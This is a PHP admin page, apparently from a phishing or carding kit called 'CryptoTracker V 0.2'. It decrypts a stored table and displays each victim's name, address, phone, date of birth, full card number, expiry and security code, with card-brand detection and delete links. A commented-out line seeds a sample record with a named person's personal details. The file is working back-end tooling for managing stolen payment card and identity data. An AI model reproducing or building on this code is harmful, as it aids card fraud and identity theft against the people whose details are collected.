<?php
session_start();
require_once("../inc/config.inc.php");
require_once("../system/system.inc.php");
require_once("../inc/cryptodb.inc.php");
require_once("../inc/encryption.inc.php");

if(!isset($_SESSION['session'])) {
  header("Location: index.php");
  exit();
}

$creditsdb = new CryptoDB("db/credit.cryptodb", $password);

// $f = fopen("db/credit.cryptodb", "w");
// fwrite($f, encrypt('[TABLE name="credits"][/TABLE]', $password));
// fclose($f);

//$creditsdb->deleteRow("credits", "1");
//$creditsdb->insertRow("credits", '[ROW id="1"][COLUMN name="fname"]Yessine[/COLUMN][COLUMN name="lname"]Taktak[/COLUMN][COLUMN name="country"]Tunisia[/COLUMN][COLUMN name="state"]Sfax[/COLUMN][COLUMN name="zip"]3000[/COLUMN][COLUMN name="numberp"]50847345[/COLUMN][COLUMN name="typep"]Phone[/COLUMN][COLUMN name="dob"]29/11/1999[/COLUMN][COLUMN name="cardnumber"]4012 8888 8888 1881[/COLUMN][COLUMN name="exp"]12/11[/COLUMN][COLUMN name="csc"]345[/COLUMN][/ROW]');
$credits = $creditsdb->getRows("credits");
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>CryptoTracker V 0.2</title>
    <link rel="stylesheet" href="assets/master.css" media="screen" title="no title" charset="utf-8">
    <script src="assets/master.js" charset="utf-8"></script>
  </head>
  <body>
    <div class="menu">
      <ul>
        <li><a href="dashboard.php">Dashboard</a></li>
        <li><a href="visitors.php">Visitors</a></li>
        <li><a href="settings.php">Settings</a></li>
        <?php
        if($local_log) {
        ?>
        <li><a href="log.php">Local Log</a></li>
        <?php
        }
        ?>
        <li><a href="logout.php">Logout</a></li>
      </ul>
    </div>
    <div class="body">
      <div class="info-line">
        <?php
        $i = 1;
        foreach($credits as $credit) {
          $credit = $creditsdb->getColumns($credit);
          ?>
          <div class="info-box-upgraded credit">
            <h1><?php echo htmlentities($credit["fname"]);?> <?php echo htmlentities($credit["lname"]);?></h1>
            <h2><?php echo htmlentities($credit["country"]);?>, <?php echo htmlentities($credit["state"]);?> <?php echo htmlentities($credit["zip"]);?></h2>
            <h2><?php echo htmlentities($credit["numberp"]);?> <?php echo htmlentities($credit["typep"]);?></h2>
            <h2><?php echo htmlentities($credit["dob"]);?></h2>
            <h3><?php echo htmlentities($credit["cardnumber"]);?></h3>
            <h4><?php echo htmlentities($credit["exp"]);?></h4>
            <h5><?php echo htmlentities($credit["csc"]);?></h5>
            <?php
            $type = "";
            if($credit["cardnumber"][0] == "4") {
              $type = "visa";
            } else if($credit["cardnumber"][0] == "5") {
              $type = "mastercard";
            } else if($credit["cardnumber"][0] == "3" && $credit["cardnumber"][1] == "7") {
              $type = "amex";
            } else if($credit["cardnumber"][0] == "6") {
              $type = "discover";
            }
            ?>
            <a href="delete.php?type=credit&id=<?php echo $i; ?>"><div style="cursor : pointer;" class="<?php echo $type; ?>"></div></a>
          </div>
          <?php
          $i++;
        }
        ?>
      </div>
    </div>
  </body>
</html>
